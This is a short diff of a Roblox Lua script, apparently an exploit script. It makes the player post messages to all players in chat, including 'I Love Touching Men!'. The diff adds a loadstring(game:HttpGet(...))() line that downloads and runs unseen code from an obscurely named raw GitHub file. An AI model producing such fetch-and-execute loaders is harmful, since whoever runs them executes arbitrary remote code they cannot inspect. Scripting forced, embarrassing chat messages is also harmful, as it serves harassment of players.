@@ -6,4 +6,4 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 task.wait(3)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Love Touching Men!", "All")
 task.wait(3)
-loadstring(game:HttpGet"link")()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/orruunestad/feiwruewiojfds/refs/heads/main/funnyfunny")()
